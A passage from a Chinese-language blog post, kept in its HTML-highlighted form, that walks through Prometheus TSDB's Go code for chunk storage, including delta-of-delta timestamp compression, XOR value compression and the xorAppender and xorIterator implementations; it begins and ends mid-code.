检测stream切片是否为空(略)</span></span><br><span class="line"> <span class="comment">// 截断之后，再次读取stream中第一个byte元素，凑齐8个bit</span></span><br><span class="line"> byt |= b.stream[<span class="number">0</span>] &gt;&gt; b.count</span><br><span class="line"> <span class="keyword">return</span> byt, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看bstream.readBit()方法，它主要实现了读取单个bit位的功能，具体实现如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *bstream)</span> <span class="title">readBit</span><span class="params">()</span> <span class="params">(bit, error)</span></span> &#123;</span><br><span class="line"> <span class="keyword">if</span> <span class="built_in">len</span>(b.stream) == <span class="number">0</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>, io.EOF</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">// 检测当前stream切片是否为空(略)</span></span><br><span class="line"> <span class="keyword">if</span> b.count == <span class="number">0</span> &#123; <span class="comment">// count为0表示stream切片中的第一个byte元素已读取完毕</span></span><br><span class="line"> b.stream = b.stream[<span class="number">1</span>:] <span class="comment">// 截掉第一个byte元素</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> <span class="built_in">len</span>(b.stream) == <span class="number">0</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>, io.EOF</span><br><span class="line"> &#125;</span><br><span class="line"> b.count = <span class="number">8</span> <span class="comment">// 将count字段重置为8</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">// 读取第一个bit位</span></span><br><span class="line"> d := (b.stream[<span class="number">0</span>] &lt;&lt; (<span class="number">8</span> - b.count)) &amp; <span class="number">0x80</span></span><br><span class="line"> b.count-- <span class="comment">// 递减count字段，表示该byte中剩余可读取的bit数</span></span><br><span class="line"> <span class="keyword">return</span> d != <span class="number">0</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，与writeBits()方法对应的是readBits()方法，它实现了一次读取多个bit位的功能，当读取的bit个数超过8个，则首先通过readByte()方法按照byte进行读取，之后当需要读取的bit个数不足8个时，则会调用readBit()方法逐个读取bit值，其实现比较简单，这里不再展开详细介绍。</p><h2 id="Chunk接口"><a href="#Chunk接口" class="headerlink" title="Chunk接口"></a>Chunk接口</h2><p>在上一篇文章中提到，在磁盘存储中每个block中的时序数据存储在chunk文件中。Prometheus TSDB中对应的抽象是Chunk接口，它表示一组时序点的集合，其定义如下所示。Chunk接口有两个紧密相关的接口：Append接口和Iterator接口，我们可以通过该Append接口向Chunk中追加时序点，也可以通过Iterator接口迭代Chunk中存储的时序点。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Chunk <span class="keyword">interface</span> &#123;</span><br><span class="line"> Bytes() []<span class="keyword">byte</span> <span class="comment">// 存储时序点的byte切片，通过前面介绍的bstream完成读写</span></span><br><span class="line"> Encoding() Encoding <span class="comment">// 编码类型，目前只有XOR这一种编码类型</span></span><br><span class="line"> Appender() (Appender, error) <span class="comment">// 返回该Chunk关联的Appender实例 </span></span><br><span class="line"> Iterator() Iterator <span class="comment">// 返回该Chunk关联的Iterator实例</span></span><br><span class="line"> NumSamples() <span class="keyword">int</span> <span class="comment">// 返回该Chunk中保存时序点的个数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的Append接口和Iterator接口的定义都比较简单，如下所示。Append接口中只有一个Append()方法，用于向Chunk实例中追加一个时序点，其接收的参数分别是时序点的timestamp和value值。Iterator与我们常见的迭代器类似。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Appender <span class="keyword">interface</span> &#123;</span><br><span class="line"> Append(<span class="keyword">int64</span>, <span class="keyword">float64</span>)  <span class="comment">// 每个时序点都是有对应的timestamp和value值组成的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Iterator <span class="keyword">interface</span> &#123;</span><br><span class="line"> At() (<span class="keyword">int64</span>, <span class="keyword">float64</span>) <span class="comment">// 返回当前时序点的timestamp和value值</span></span><br><span class="line"> Err() error <span class="comment">// 返回迭代过程中发生的异常</span></span><br><span class="line"> Next() <span class="keyword">bool</span> <span class="comment">// 检测后续是否有时序点可以继续迭代</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="XORChunk实现"><a href="#XORChunk实现" class="headerlink" title="XORChunk实现"></a>XORChunk实现</h2><p>XORChunk是Prometheus TSDB实现中Chunk接口的唯一实现，它只有b（*bstream类型）一个字段，主要用于存储时序数据。XORChunk关联的Appender接口实现为xorAppender，其核心字段如下：</p><ul><li><strong>b（*bstream）</strong>：bstream实例，存储写入的时序点的数据。</li><li><strong>t（int64类型）</strong>：记录上次写入时序点对应的timestamp。</li><li><strong>v（float64类型）</strong>：记录上次写入时序点对应的value值。</li><li><strong>tDelta（uint64类型）：</strong>记录当前点与前一个点的timestamp差值。</li><li><strong>leading（uint8）：</strong>记录当前XOR运算结果中前置”0”的个数。</li><li><strong>trailing</strong>（<strong>uint8</strong>）：记录当前XOR运算结果中后置”0”的个数。</li></ul><p>XORChunk中只有两个方法需要介绍，一个是XORChunk.iterator()方法，用于创建xorIterator实例，xorIterator实例用于迭代XORChunk中的时序点，iterator()方法的具体实现如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *XORChunk)</span> <span class="title">iterator</span><span class="params">()</span> *<span class="title">xorIterator</span></span> &#123;</span><br><span class="line"> <span class="keyword">return</span> &amp;xorIterator&#123;</span><br><span class="line"> <span class="comment">// bstream中前两个byte元素存储的是XORChunk中时序点的个数，所以这里要跳过</span></span><br><span class="line"> br: newBReader(c.b.bytes()[<span class="number">2</span>:]),</span><br><span class="line"> <span class="comment">// 读取bstream中前两个byte元素，获取XORChunk实例中存储的时序点的个数</span></span><br><span class="line"> numTotal: binary.BigEndian.Uint16(c.b.bytes()),</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另一个方法是XORChunk.Appender()方法，用于创建xorAppender实例，xorAppender负责向该XORChunk实例中追加时序点，Appender()方法的具体实现如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *XORChunk)</span> <span class="title">Appender</span><span class="params">()</span> <span class="params">(Appender, error)</span></span> &#123;</span><br><span class="line"> it := c.iterator() <span class="comment">// 创建xorIterator迭代器</span></span><br><span class="line"> <span class="keyword">for</span> it.Next() &#123; <span class="comment">// 迭代XORChunk中已有的全部时序点，直至结束，这样才能得到可以写入的正确状态</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> a := &amp;xorAppender&#123; <span class="comment">// 根据xorIterator迭代器的状态创建xorAppender实例</span></span><br><span class="line"> b: c.b,</span><br><span class="line"> t: it.t,</span><br><span class="line"> v: it.val,</span><br><span class="line"> tDelta: it.tDelta,</span><br><span class="line"> leading: it.leading,</span><br><span class="line">  trailing: it.trailing,</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> binary.BigEndian.Uint16(a.b.bytes()) == <span class="number">0</span> &#123;<span class="comment">// 如果是空XORChunk会初始化leading</span></span><br><span class="line"> a.leading = <span class="number">0xff</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> a, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="xorAppender"><a href="#xorAppender" class="headerlink" title="xorAppender"></a><strong>xorAppender</strong></h2><p>下面来看xorAppender.Append()方法的具体实现，其参数是待写入时序点的timestamp和value值，这里会按照前面介绍的delta-of-delta时间戳压缩方式存储timestamp，按照XOR压缩方式存储value值。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *xorAppender)</span> <span class="title">Append</span><span class="params">(t <span class="keyword">int64</span>, v <span class="keyword">float64</span>)</span></span> &#123;</span><br><span class="line"> <span class="keyword">var</span> tDelta <span class="keyword">uint64</span></span><br><span class="line"> <span class="comment">// XORChunk会使用bstream中前两个byte记录已写入的时序点的个数，这里就是读取该值</span></span><br><span class="line"> num := binary.BigEndian.Uint16(a.b.bytes())</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> num == <span class="number">0</span> &#123; <span class="comment">// 每个XORChunk中需要完整记录第一个点的timestamp和value值</span></span><br><span class="line"> buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, binary.MaxVarintLen64) <span class="comment">// 创建一个足够存储timestamp的byte切片</span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">for</span> _, b := <span class="keyword">range</span> buf[:binary.PutVarint(buf, t)] &#123;<span class="comment">// 将timestamp完整写入到bstream中</span></span><br><span class="line"> a.b.writeByte(b)</span><br><span class="line"> &#125;</span><br><span class="line"> a.b.writeBits(math.Float64bits(v), <span class="number">64</span>) <span class="comment">// 将第一个时序点的value值写入到bstream中</span></span><br><span class="line"> &#125; <span class="keyword">else</span> <span class="keyword">if</span> num == <span class="number">1</span> &#123; <span class="comment">// 根据num判断，此次写入的是第二个时序点</span></span><br><span class="line"> tDelta = <span class="keyword">uint64</span>(t - a.t) <span class="comment">// 计算该点与前一个时序点的timestamp差值</span></span><br><span class="line"> <span class="comment">// 下面将当前时序点与前一个时序点的timestamp差值写入到bstream中</span></span><br><span class="line"> buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, binary.MaxVarintLen64)</span><br><span class="line"> <span class="keyword">for</span> _, b := <span class="keyword">range</span> buf[:binary.PutUvarint(buf, tDelta)] &#123;</span><br><span class="line">  a.b.writeByte(b)</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">// 计算该时序点与前一个时序点value值的XOR值，并按照前面介绍的压缩方式记录到bstream中，</span></span><br><span class="line"> <span class="comment">// xorAppender.writeVDelta()方法的具体实现在后面进行详细介绍</span></span><br><span class="line"> a.writeVDelta(v) </span><br><span class="line"> &#125; <span class="keyword">else</span> &#123; <span class="comment">// 根据num判断，写入第三个以及之后的时序点</span></span><br><span class="line"> tDelta = <span class="keyword">uint64</span>(t - a.t) <span class="comment">// 计算该时序点与前一个时序点的timestamp差值</span></span><br><span class="line"> dod := <span class="keyword">int64</span>(tDelta - a.tDelta) <span class="comment">// 计算两个timestamp的dod（delta-of-delta）值</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">switch</span> &#123;</span><br><span class="line"> <span class="keyword">case</span> dod == <span class="number">0</span>: <span class="comment">// 如果dod差值为0，则只需要记录一个值为"0"的bit值</span></span><br><span class="line"> a.b.writeBit(zero)</span><br><span class="line"> <span class="keyword">case</span> bitRange(dod, <span class="number">14</span>): </span><br><span class="line"> <span class="comment">// 如果dod值在[-8191, 8192]范围中，则使用"10"作为标识，然后使用14个bit位存储dod值</span></span><br><span class="line"> a.b.writeBits(<span class="number">0x02</span>, <span class="number">2</span>)</span><br><span class="line"> a.b.writeBits(<span class="keyword">uint64</span>(dod), <span class="number">14</span>)</span><br><span class="line"> <span class="keyword">case</span> bitRange(dod, <span class="number">17</span>):</span><br><span class="line"> <span class="comment">// 如果dod值在[-65535, 65536]范围中，则使用"110"作为标识，然后使用17个bit位存储dod值</span></span><br><span class="line"> a.b.writeBits(<span class="number">0x06</span>, <span class="number">3</span>) </span><br><span class="line"> a.b.writeBits(<span class="keyword">uint64</span>(dod), <span class="number">17</span>)</span><br><span class="line"> <span class="keyword">case</span> bitRange(dod, <span class="number">20</span>):</span><br><span class="line"> <span class="comment">// 如果dod值在[-524287, 524288]范围中，则使用"1110"作为标识，然后使用20位存储dod值</span></span><br><span class="line"> a.b.writeBits(<span class="number">0x0e</span>, <span class="number">4</span>)</span><br><span class="line"> a.b.writeBits(<span class="keyword">uint64</span>(dod), <span class="number">20</span>)</span><br><span class="line"> <span class="keyword">default</span>: <span class="comment">// 如果dod值超出了上述返回，则使用"1111"作为标识，然后使用64个bit位存储dod值</span></span><br><span class="line"> a.b.writeBits(<span class="number">0x0f</span>, <span class="number">4</span>)</span><br><span class="line"> a.b.writeBits(<span class="keyword">uint64</span>(dod), <span class="number">64</span>)</span><br><span class="line">  &#125;</span><br><span class="line"> a.writeVDelta(v) <span class="comment">// 计算当前时序点与前一个时序点value值的XOR，并记录到bstream中</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> a.t = t <span class="comment">// 更新t、v字段，记录当前时序点的时间戳和value值，为下一个时序点的写入做准备</span></span><br><span class="line"> a.v = v</span><br><span class="line"> binary.BigEndian.PutUint16(a.b.bytes(), num + <span class="number">1</span>) <span class="comment">// 更新该XORChunk已写入的点的个数</span></span><br><span class="line"> a.tDelta = tDelta <span class="comment">// 记录当前时序点和前一个时序点的timestamp差值，为下次计算dod值做准备</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过对xorAppender.Append()方法的分析，我们了解了Prometheus TSDB对timestamp压缩的具体实现。接下来深入分析xorAppender.writeVDelta()方法，看Prometheus TSDB如何实现对value值的压缩。在writeVDelta()方法中，会计算当前时序点的value值与前一时序点的value值的XOR值，并根据XOR运算结果值中前置“0”和后置“0”的个数进行相应的压缩存储，具体的压缩规则在上一节已经介绍过了，这里重点看一下writeVDelta()方法对该压缩方式的实现。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *xorAppender)</span> <span class="title">writeVDelta</span><span class="params">(v <span class="keyword">float64</span>)</span></span> &#123;</span><br><span class="line"> <span class="comment">// 计算当前时序点的value值与前一个时序点的value值之间的XOR值</span></span><br><span class="line"> vDelta := math.Float64bits(v) ^ math.Float64bits(a.v)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> vDelta == <span class="number">0</span> &#123; <span class="comment">// 如果两个时序点的value值相同，则只写入一个值为"0"的bit位</span></span><br><span class="line"> a.b.writeBit(zero)</span><br><span class="line"> <span class="keyword">return</span></span><br><span class="line"> &#125;</span><br><span class="line"> a.b.writeBit(one) <span class="comment">// 写入控制位的第一个bit位，该位的值为"1"</span></span><br><span class="line"> leading := <span class="keyword">uint8</span>(bits.LeadingZeros64(vDelta)) <span class="comment">// 返回vDelta中前置"0"的个数</span></span><br><span class="line"> trailing := <span class="keyword">uint8</span>(bits.TrailingZeros64(vDelta)) <span class="comment">// 返回vDelta中后置"0"的个数</span></span><br><span class="line"> <span class="keyword">if</span> a.leading != <span class="number">0xff</span> &amp;&amp; leading &gt;= a.leading &amp;&amp; trailing &gt;= a.trailing &#123;</span><br><span class="line"> <span class="comment">// 该vDelta值的前置"0"和后置"0"的个数都比上一次写入得到XOR值多</span></span><br><span class="line"> a.b.writeBit(zero) <span class="comment">// 写入控制位的第二个bit位，该位的值为"0"</span></span><br><span class="line"> <span class="comment">// 这里只需要记录除去前置"0"和后置"0"的部分即可</span></span><br><span class="line"> a.b.writeBits(vDelta&gt;&gt;a.trailing, <span class="number">64</span>-<span class="keyword">int</span>(a.leading)-<span class="keyword">int</span>(a.trailing))</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123; <span class="comment">// 该vDelta值的前置"0"或是后置"0"比上一次写入得到的XOR值少</span></span><br><span class="line"> <span class="comment">// 更新xorAppender的leading和trailing的字段，分别记录此次写入时得到的XOR值中前置"0"</span></span><br><span class="line"> <span class="comment">// 和后置"0"个数，这主要是为下一个时序点的写入做准备</span></span><br><span class="line"> a.leading, a.trailing = leading, trailing </span><br><span class="line"> a.b.writeBit(one) <span class="comment">// 写入控制位的第二个bit位，该位的值为"1"</span></span><br><span class="line"> a.b.writeBits(<span class="keyword">uint64</span>(leading), <span class="number">5</span>) <span class="comment">// 用5个bit位来存储XOR值中前置0的数量</span></span><br><span class="line"> sigbits := <span class="number">64</span> - leading - trailing</span><br><span class="line"> a.b.writeBits(<span class="keyword">uint64</span>(sigbits), <span class="number">6</span>) <span class="comment">// 用6个bit位来存储XOR值中间非0位的长度</span></span><br><span class="line"> a.b.writeBits(vDelta&gt;&gt;trailing, <span class="keyword">int</span>(sigbits)) <span class="comment">// 存储中间非0位的值</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>xorIterator</strong></p><p>到此为止，时序点的写入到Chunk实例的具体实现就分析完了。接下来要看的是xorIterator结构体，它是上一小节提到的Iterator接口的唯一实现，主要负责从Chunk中读取时序点，其核心字段如下所示：</p><ul><li><strong>br（*bstream类型）</strong>：关联XORChunk实例中的b字段，存储了XORChunk实例中的时序数据。</li><li><strong>numTotal（uint16类型）</strong>：关联XORChunk中存储的时序点的个数</li><li><strong>numRead（uint16类型）</strong>：通过该xorIterator实例读取的时序点的个数。</li><li><strong>t（int64类型）</strong>：当前读取的时序点的timestamp。</li><li><strong>val（float64类型）</strong>：当前读取的时序点的value值。</li><li><strong>leading（uint8类型）</strong>：当前读取到的XOR值的前置”0”个数。</li><li><strong>trailing（uint8类型）</strong>：当前读取到的XOR值的后置”0”个数。</li><li><strong>tDelta（uint64类型）</strong>：记录当前时序点与前一个时序点的timestamp的差值。</li></ul><p>Next()方法是xorIterator的核心方法之一，它会根据当前读取的是第几个时序点决定如何返回正确的timestamp和value值，先来看timestamp的读取过程如下：</p><ul><li>如果读取的是第一个时序点，则其timestamp和value值没有被压缩，直接读取即可。</li><li>如果读取的是第二个时序点，则需要第二个时序点与第一个时序点的timestamp差值，然后根据第一个点的timestamp以及timestamp差值，计算得出第二个时序点的timestamp。</li><li>如果读取的是第三个以及之后的时序点，则需要读取dod（delta-of-delta）值，然后根据前两个时序点的timestamp差值以及dod值，得出该时序点的timestamp。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(it *xorIterator)</span> <span class="title">Next</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"> <span class="comment">// 检测迭代过程中是否出现异常，则返回false，停止整个迭代过程(略)</span></span><br><span class="line"> <span class="comment">// 检测numRead字段值，如果该xorIterator已经读取完全部的时序点，也会返回false(略)</span></span><br><span class="line"> <span class="keyword">if</span> it.numRead == <span class="number">0</span> &#123; <span class="comment">// 读取XORChunk实例中第一个时序点</span></span><br><span class="line"> t, err := binary.ReadVarint(it.br) <span class="comment">// 从bstream中读取第一个时序点的完整timestamp</span></span><br><span class="line"> v, err := it.br.readBits(<span class="number">64</span>) <span class="comment">// 从bstream中读取第一个时序点完整的value值</span></span><br><span class="line"> it.t = t <span class="comment">// 更新t、val字段，记录当前时序点的timestamp和value值，在At()方法中会返回这两个值</span></span><br><span class="line"> it.val = math.Float64frombits(v)</span><br><span class="line"> it.numRead++ <span class="comment">// 递增已读取的点的个数</span></span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> it.numRead == <span class="number">1</span> &#123; <span class="comment">// 读取XORChunk中第二个时序点</span></span><br><span class="line">  <span class="comment">// 从bstream中读取第二个点与第一个点的timestamp差值</span></span><br><span class="line"> tDelta, err := binary.ReadUvarint(it.br)</span><br><span class="line"> it.tDelta = tDelta <span class="comment">// 更新tDelta字段，记录timestamp差值</span></span><br><span class="line"> it.t = it.t + <span class="keyword">int64</span>(it.tDelta) <span class="comment">// 计算第二个时序点对应的timestamp</span></span><br><span class="line"> <span class="comment">// 读取第二个时序点的value值，xorIterator.readValue()方法的具体内容在后面详细介绍</span></span><br><span class="line"> <span class="keyword">return</span> it.readValue()</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">// 在读取XORChunk中第三个时序点以及之后的时序点时，会执行下面的逻辑</span></span><br><span class="line"> <span class="keyword">var</span> d <span class="keyword">byte</span></span><br><span class="line"> <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">4</span>; i++ &#123; <span class="comment">// 首先读取标识位</span></span><br><span class="line"> d &lt;&lt;= <span class="number">1</span> <span class="comment">// 将d左移一位，为读取下一位做准备</span></span><br><span class="line"> bit, err := it.br.readBit()</span><br><span class="line"> <span class="keyword">if</span> bit == zero &#123; <span class="comment">// 在读取标识位的过程中遇到"0"位，则表示标识位已经读取结束</span></span><br><span class="line">  <span class="keyword">break</span></span><br><span class="line"> &#125;</span><br><span class="line"> d |= <span class="number">1</span> <span class="comment">// 该bit位不为"0"，则将对应bit位设置为1</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">var</span> sz <span class="keyword">uint8</span> <span class="comment">// 后续需要读取多少个bit位，才能得到dod(delta-of-delta)值</span></span><br><span class="line"> <span class="keyword">var</span> dod <span class="keyword">int64</span></span><br><span class="line"> <span class="keyword">switch</span> d &#123; <span class="comment">// 如果标识位为"0"，则表示时间戳的dod(delta-of-delta)值为0</span></span><br><span class="line"> <span class="keyword">case</span> <span class="number">0x00</span>:</span><br><span class="line"> <span class="comment">// dod == 0</span></span><br><span class="line"> <span class="keyword">case</span> <span class="number">0x02</span>: <span class="comment">// 如果标识位为"10"，则表示时间戳的dod值在[-8191, 8192]范围中，需要读取14个bit位</span></span><br><span class="line"> sz = <span class="number">14</span></span><br><span class="line"> <span class="keyword">case</span> <span class="number">0x06</span>: </span><br><span class="line"> <span class="comment">// 如果标识位为"110"，则表示时间戳的dod值在[-65535, 65536]范围中，需要读取17个bit位</span></span><br><span class="line"> sz = <span class="number">17</span> </span><br><span class="line"> <span class="keyword">case</span> <span class="number">0x0e</span>: </span><br><span class="line"> <span class="comment">// 如果标识位为"1110"，则表示时间戳的dod值在[-524287, 524288]范围中，需要读取20个bit位</span></span><br><span class="line"> sz = <span class="number">20</span></span><br><span class="line"> <span class="keyword">case</span> <span class="number">0x0f</span>: <span class="comment">// 如果标识位为"1111"，则表示时间戳的dod值超出了上述范围，需要读取64个bit位</span></span><br><span class="line"> bits, err := it.br.readBits(<span class="number">64</span>)</span><br><span class="line"> dod = <span class="keyword">int64</span>(bits)</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> sz != <span class="number">0</span> &#123; <span class="comment">// 标识位为"10"、"110"、"1110"，则读取指定的数量的bit位，获得dod值</span></span><br><span class="line"> bits, err := it.br.readBits(<span class="keyword">int</span>(sz))</span><br><span class="line"> dod = <span class="keyword">int64</span>(bits)</span><br><span class="line"> &#125;</span><br><span class="line">  it.tDelta = <span class="keyword">uint64</span>(<span class="keyword">int64</span>(it.tDelta) + dod) <span class="comment">// 计算两个点的时间戳的差值</span></span><br><span class="line"> it.t = it.t + <span class="keyword">int64</span>(it.tDelta) <span class="comment">// 根据上一点的时间戳计算当前点的时间戳</span></span><br><span class="line"> <span class="keyword">return</span> it.readValue() <span class="comment">// readValue()方法的具体内容在后面详细介绍</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在xorIterator.Next()方法读取timestamp的同时，还会调用readValue()方法读取时序点的value值。在readValue()方法中首先会读取控制位，然后根据控制位确定value值，其具体步骤如下所示：</p><ol><li>如果控制位的第一个bit位为“0”，则表示当前时序点的value值与前一个value值相同，后续无需进行任何读取操作。否则，读取控制位的第二个bit位。</li><li>如果控制位的第二个bit位为“0”，则表示当前XOR结果的前置“0”和后置“0”与前一个XOR结果的个数相同，后续直接读取当前XOR结果中间非零部分即可。</li><li>如果控制位的第二个bit位为“1”，则需要先读取当前XOR结果中前置“0”的个数，然后读取XOR结果中间非零部分的长度，最后读取中间非零部分的值。</li><li>最后根据前一个点的value值以及XOR运算结果，得到当前点的value值。</li></ol><p>下面是xorIterator.readValue()方法的具体实现分析：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(it *xorIterator)</span> <span class="title">readValue</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"> bit, err := it.br.readBit() <span class="comment">// 读取控制位的第一个bit位</span></span><br><span class="line"> <span class="keyword">if</span> bit == zero &#123; </span><br><span class="line"> <span class="comment">// 如果控制位第一个bit位为"0"，则表示当前时序点的value值与前一个点的value值相同</span></span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> bit, err := it.br.readBit() <span class="comment">// 如果控制位第一个bit位为"1"，则需要读取第二个控制位</span></span><br><span class="line"> <span class="keyword">if</span> bit == zero &#123; </span><br><span class="line"> <span class="comment">// 控制位为"10"，则表示可以直接读取XOR值的中间非0部分(因为其前置"0"和后置"0"与前一个</span></span><br><span class="line">  <span 